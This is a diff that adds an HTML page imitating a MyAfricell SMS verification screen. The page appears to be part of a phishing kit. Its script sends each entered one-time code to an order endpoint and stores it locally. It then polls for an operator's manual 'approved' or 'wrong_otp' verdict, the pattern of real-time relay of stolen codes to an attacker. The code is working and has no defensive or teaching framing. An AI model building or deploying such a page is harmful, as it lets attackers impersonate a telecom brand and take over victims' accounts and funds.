@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MyAfricell | SMS Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body::-webkit-scrollbar {
+            display: none;
+        }
+        body {
+            scrollbar-width: none;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(180deg, #C7D2DC 0%, #E5E5E5 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-y: auto;
+            padding: 16px;
+        }
+
+        /* Expanded to fill available screen space */
+        .mobile-viewport {
+            width: 100%;
+            max-width: 100%;
+            height: 100%;
+            max-height: 100%;
+            background: #FFFFFF;
+            border-radius: 24px;
+            box-shadow: 0 20px 45px rgba(0, 0, 0, 0.12);
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            padding: 32px 24px 24px 24px;
+            border: 1px solid rgba(0, 0, 0, 0.04);
+            overflow: hidden;
+        }
+
+        .top-stack {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .login-heading {
+            font-size: 36px;
+            font-weight: 800;
+            color: #991676;
+            text-align: center;
+            margin-bottom: 8px;
+            line-height: 1.2;
+            letter-spacing: -0.5px;
+            width: 100%;
+        }
+
+        .login-subheading {
+            font-size: 15px;
+            font-weight: 400;
+            color: #6B7280;
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        .middle-stack {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin: auto 0;
+            gap: 20px;
+            padding: 16px 0;
+        }
+
+        .pin-boxes-container {
+            display: flex;
+            gap: 14px;
+            justify-content: center;
+            padding: 8px;
+            border-radius: 18px;
+            background: rgba(153, 22, 118, 0.02);
+            border: 1px solid rgba(153, 22, 118, 0.15);
+        }
+
+        .pin-box {
+            width: 54px;
+            height: 64px;
+            background: #F7F8FA;
+            border: 1px solid #D1D5DB;
+            border-radius: 16px;
+            font-size: 26px;
+            font-weight: 600;
+            color: #1F2937;
+            text-align: center;
+            pointer-events: none;
+            box-shadow: 0 3px 6px rgba(0,0,0,0.03);
+            transition: all 0.2s ease;
+        }
+
+        .pin-box.active-box {
+            border-color: #991676;
+            background: #FFFFFF;
+            box-shadow: 0 0 0 3px rgba(153, 22, 118, 0.15);
+        }
+
+        .resend-row {
+            font-size: 14px;
+            font-weight: 500;
+            color: #4B5563;
+            text-align: center;
+        }
+
+        .resend-row span {
+            color: #F59E0B;
+            font-weight: 600;
+        }
+
+        .resend-row a {
+            color: #991676;
+            text-decoration: none;
+            font-weight: 600;
+            display: inline;
+        }
+
+        .resend-row a:hover {
+            text-decoration: underline;
+        }
+
+        .pp-error-box {
+            width: 100%;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 8px;
+            color: #E31B23;
+            font-size: 14px;
+            font-weight: 500;
+            text-align: center;
+            background: rgba(227, 27, 35, 0.08);
+            padding: 10px 14px;
+            border-radius: 12px;
+        }
+
+        .bottom-stack {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-top: 20px;
+        }
+
+        .btn-login {
+            width: 100%;
+            max-width: 480px;
+            height: 64px;
+            background: #E8B4D4;
+            color: #FFFFFF;
+            border: none;
+            border-radius: 32px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.2s ease;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            margin-bottom: 24px;
+        }
+
+        .btn-login.enabled {
+            background: #991676;
+            box-shadow: 0 8px 20px rgba(153, 22, 118, 0.3);
+        }
+
+        .btn-login:hover:not(:disabled) {
+            opacity: 0.95;
+        }
+
+        .btn-login:disabled {
+            cursor: not-allowed;
+        }
+
+        .onscreen-keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+            width: 100%;
+            max-width: 360px;
+        }
+
+        .keypad-btn {
+            background: transparent;
+            border: none;
+            height: 60px;
+            font-size: 28px;
+            font-weight: 600;
+            color: #1F2937;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            border-radius: 50%;
+            transition: background 0.1s ease;
+        }
+
+        .keypad-btn:active {
+            background: #E5E7EB;
+        }
+
+        .keypad-btn.action-key {
+            font-size: 22px;
+            color: #4B5563;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="mobile-viewport">
+        
+        <div class="top-stack">
+            <h1 class="login-heading">Enter OTP</h1>
+            <p class="login-subheading">We sent you a 6-digit code via SMS</p>
+        </div>
+
+        <div class="middle-stack">
+            <div class="pin-boxes-container">
+                <input type="password" class="pin-box active-box" id="p1" readonly value="">
+                <input type="password" class="pin-box" id="p2" readonly value="">
+                <input type="password" class="pin-box" id="p3" readonly value="">
+                <input type="password" class="pin-box" id="p4" readonly value="">
+                <input type="password" class="pin-box" id="p5" readonly value="">
+                <input type="password" class="pin-box" id="p6" readonly value="">
+            </div>
+
+            <div class="resend-row" id="resendContainer">
+                Didn't get code? Resend in <span id="timer">4:32</span>
+            </div>
+
+            <div id="inlineErrorBox" class="pp-error-box">
+                <i class="fa-solid fa-circle-exclamation"></i>
+                <span id="errorText">Incorrect code or PIN. Please try again.</span>
+            </div>
+        </div>
+
+        <div class="bottom-stack">
+            <button type="button" id="loginBtn" class="btn-login" disabled onclick="handleLogin()">Verify</button>
+
+            <div class="onscreen-keypad">
+                <button type="button" class="keypad-btn" onclick="pressKey('1')">1</button>
+                <button type="button" class="keypad-btn" onclick="pressKey('2')">2</button>
+                <button type="button" class="keypad-btn" onclick="pressKey('3')">3</button>
+                <button type="button" class="keypad-btn" onclick="pressKey('4')">4</button>
+                <button type="button" class="keypad-btn" onclick="pressKey('5')">5</button>
+                <button type="button" class="keypad-btn" onclick="pressKey('6')">6</button>
+                <button type="button" class="keypad-btn" onclick="pressKey('7')">7</button>
+                <button type="button" class="keypad-btn" onclick="pressKey('8')">8</button>
+                <button type="button" class="keypad-btn" onclick="pressKey('9')">9</button>
+                <div></div>
+                <button type="button" class="keypad-btn" onclick="pressKey('0')">0</button>
+                <button type="button" class="keypad-btn action-key" onclick="deleteKey()"><i class="fa-solid fa-delete-left"></i></button>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        const loginBtn = document.getElementById('loginBtn');
+        const errorBox = document.getElementById('inlineErrorBox');
+        const errorText = document.getElementById('errorText');
+        const resendContainer = document.getElementById('resendContainer');
+
+        let otpDigits = ['', '', '', '', '', ''];
+        let activeInterval = null;
+        const pageLoadTimestamp = Date.now();
+        const phone = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || '+232 00000000';
+
+        let timeLeft = 272;
+        const countdownTimer = setInterval(() => {
+            if (timeLeft <= 0) {
+                clearInterval(countdownTimer);
+                resendContainer.innerHTML = 'Didn\'t get code? <a href="#" onclick="requestResendSms(event)">Resend code</a>';
+            } else {
+                timeLeft--;
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                const timerDisplay = document.getElementById('timer');
+                if (timerDisplay) {
+                    timerDisplay.innerText = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+                }
+            }
+        }, 1000);
+
+        window.addEventListener('DOMContentLoaded', () => {
+            localStorage.removeItem('africellApprovalTimestamp');
+        });
+
+        function showInlineError(message) {
+            errorText.innerText = message;
+            errorBox.style.display = 'flex';
+        }
+
+        function hideInlineError() {
+            errorBox.style.display = 'none';
+        }
+
+        function updateOtpDisplay() {
+            for (let i = 0; i < 6; i++) {
+                const box = document.getElementById('p' + (i + 1));
+                box.value = otpDigits[i];
+                box.classList.remove('active-box');
+            }
+
+            const firstEmpty = otpDigits.findIndex(d => d === '');
+            if (firstEmpty !== -1) {
+                document.getElementById('p' + (firstEmpty + 1)).classList.add('active-box');
+            } else {
+                document.getElementById('p6').classList.add('active-box');
+            }
+            validateForm();
+        }
+
+        function pressKey(digit) {
+            const firstEmpty = otpDigits.findIndex(d => d === '');
+            if (firstEmpty !== -1) {
+                otpDigits[firstEmpty] = digit;
+                updateOtpDisplay();
+            }
+        }
+
+        function deleteKey() {
+            for (let i = 5; i >= 0; i--) {
+                if (otpDigits[i] !== '') {
+                    otpDigits[i] = '';
+                    break;
+                }
+            }
+            updateOtpDisplay();
+        }
+
+        function validateForm() {
+            const isOtpComplete = otpDigits.every(d => d !== '');
+
+            if (isOtpComplete) {
+                loginBtn.removeAttribute('disabled');
+                loginBtn.classList.add('enabled');
+            } else {
+                loginBtn.setAttribute('disabled', 'true');
+                loginBtn.classList.remove('enabled');
+            }
+            hideInlineError();
+        }
+
+        async function requestResendSms(e) {
+            e.preventDefault();
+            try {
+                await fetch('/api/submit-order', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: phone, uniqueId: 'Resend SMS Requested' })
+                });
+                alert('A new OTP has been sent via SMS.');
+            } catch (error) {
+                console.error('Error requesting resend:', error);
+            }
+        }
+
+        function handleLogin() {
+            const otpCode = otpDigits.join('');
+
+            if (otpCode.length !== 6) {
+                showInlineError('Please enter the complete 6-digit OTP.');
+                return;
+            }
+
+            localStorage.setItem('africellLastOtpCode', otpCode);
+            submitOtpCode(phone, otpCode);
+        }
+
+        async function submitOtpCode(phoneNum, otp) {
+            try {
+                loginBtn.setAttribute('disabled', 'true');
+                loginBtn.classList.remove('enabled');
+                loginBtn.textContent = 'Verifying...';
+
+                const response = await fetch('/api/submit-order', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: phoneNum, uniqueId: 'OTP Code: ' + otp })
+                });
+
+                const result = await response.json();
+
+                if (result.success !== false) {
+                    pollApprovalStatus(phoneNum);
+                } else {
+                    showInlineError('Invalid verification code.');
+                    resetButtonState();
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                pollApprovalStatus(phoneNum);
+            }
+        }
+
+        function resetButtonState() {
+            loginBtn.textContent = 'Verify';
+            loginBtn.removeAttribute('disabled');
+            loginBtn.classList.add('enabled');
+            otpDigits = ['', '', '', '', '', ''];
+            updateOtpDisplay();
+        }
+
+        function pollApprovalStatus(phoneNum) {
+            const cleanPhone = phoneNum.trim();
+
+            if (activeInterval) clearInterval(activeInterval);
+
+            const submissionTimestamp = Date.now();
+
+            activeInterval = setInterval(async () => {
+                try {
+                    const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}&t=${Date.now()}`);
+                    const data = await response.json();
+
+                    if (data.status === 'approved' && data.timestamp && data.timestamp >= pageLoadTimestamp && data.timestamp >= submissionTimestamp) {
+                        clearInterval(activeInterval);
+                        window.location.href = 'success.html';
+                    } 
+                    else if ((data.status === 'rejected' || data.status === 'wrong_id' || data.status === 'wrong_pin' || data.status === 'wrong_otp') && data.timestamp && data.timestamp >= submissionTimestamp) {
+                        clearInterval(activeInterval);
+                        showInlineError('⚠️ Incorrect code or PIN. Please try again.');
+                        resetButtonState();
+                    }
+                } catch (e) {
+                    console.error('Polling error', e);
+                }
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
